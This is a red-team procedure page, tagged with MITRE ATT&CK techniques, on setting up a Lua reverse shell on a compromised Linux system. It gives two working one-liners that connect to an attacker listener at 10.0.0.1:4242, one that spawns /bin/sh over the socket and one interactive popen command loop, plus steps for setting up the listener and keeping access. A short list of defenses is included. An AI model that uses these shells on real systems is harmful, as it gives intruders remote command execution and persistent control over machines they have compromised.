---
id: fb5826d1-20d4-4a34-9bf3-31f66fc5e74e
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.654256+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - >-
    [[techniques/Custom Command and Control Protocol|T1094 - Custom Command and
    Control Protocol]]
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/Lua]]'
  - '[[tags/Reverse Shell]]'
commands: []
platforms:
  - Linux
tools: []
validated: true
---

# Implement Lua Reverse Shell

## Summary

This procedure demonstrates how to implement a Lua-based reverse shell to establish remote command execution on a compromised Linux system. By executing a Lua script that connects back to an attacker-controlled listener, an attacker can send commands to the target and receive output, enabling post-exploitation activities such as data exfiltration or lateral movement.

## Description

A Lua reverse shell leverages the Lua scripting language's socket and OS libraries to create a TCP connection from the target machine to the attacker's listener. This technique is useful in environments where Lua is installed (e.g., on servers or embedded systems) and can bypass outbound firewall restrictions by initiating the connection from the target. The procedure covers two variants: a basic one-liner for quick access and an interactive version for sustained command execution. It assumes the attacker has initial code execution on the target, such as via a vulnerability exploit or file upload. Success results in a remote shell session, allowing arbitrary command execution. This maps to MITRE ATT&CK tactics for Command and Control, using custom protocols and remote access tools.

## Requirements

1. Lua interpreter (version 5.1 or compatible) installed on the target Linux machine.
2. LuaSocket library available on the target for TCP connectivity.
3. Attacker machine with a public or reachable IP address and a listener (e.g., netcat) running on a specified port.
4. Initial code execution capability on the target to run the Lua script.

## Defense

- Restrict Lua installations to only necessary systems and monitor for unauthorized script execution.
- Implement application whitelisting to prevent execution of untrusted Lua scripts.
- Monitor network traffic for outbound TCP connections to unusual IPs/ports from internal systems.
- Enable logging of process creation and network activity to detect reverse shell patterns.

## Objectives

1. Establish a TCP connection from the target to the attacker's listener.
2. Enable remote command execution on the target system.
3. Maintain persistent access for post-exploitation tasks.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Before executing the reverse shell on the target, start a listener to receive the incoming connection. This ensures the target can connect and send shell output back.

Use a tool like netcat to listen on the specified port (e.g., 4242).

**Expected Output**: Listener ready message, e.g., "Listening on [any] 4242 ..."

### Step 2: Execute Basic Lua Reverse Shell

**Context**: This step deploys a simple one-liner Lua script on the target to open a basic reverse shell. It connects to the listener and redirects the shell I/O, providing immediate command access. Replace the hardcoded IP and port in the code with target-specific values before execution.

**Code** ([[codes/Lua-Basic-TCP-Reverse-Shell]]):

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

> This command requires the Lua interpreter and socket library on the target. Upon execution, it establishes the connection and spawns a /bin/sh shell, redirecting stdin/stdout/stderr to the socket (file descriptor 3). Expected output on the attacker side: A shell prompt allowing command input, e.g., typing 'whoami' returns the target's user.

### Step 3: Execute Interactive Lua Reverse Shell

**Context**: For more robust access, use this interactive variant that loops to receive and execute commands continuously. It handles command input, execution via popen, and output transmission until the connection closes. This provides a full shell-like experience. Customize the host and port as needed.

**Code** ([[codes/Lua-Interactive-TCP-Reverse-Shell]]):

```lua
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

> Run this on the target after the listener is active. It connects, enters a loop to read commands from the socket, executes them, reads output, and sends it back. Expected output: Continuous shell interaction on the attacker side, with commands like 'ls' returning directory listings without dropping the session.

### Step 4: Verify and Maintain Access

**Context**: Test the shell by sending basic commands (e.g., 'id', 'pwd') and monitor for stability. If the connection drops, re-execute the script.

**Expected Output**: Successful command responses confirming shell access, such as user ID and current directory.
